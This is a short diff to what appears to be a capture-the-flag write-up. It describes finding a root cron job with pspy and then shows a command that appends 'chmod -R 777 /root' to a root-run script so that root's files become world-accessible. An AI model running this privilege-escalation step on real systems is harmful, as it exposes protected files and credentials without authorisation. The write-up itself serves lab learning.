@@ -173,7 +173,8 @@ chmod +x pspy64
 
 planner.sh is being executed by root every minute
 
-Edit print.sh and exfiltrate files in /root
+Edit print.sh and exfiltrate files in /root<br>
+-R recursively apply permissions
 ```
 echo "chmod -R 777 /root" >> /etc/print.sh
 ```
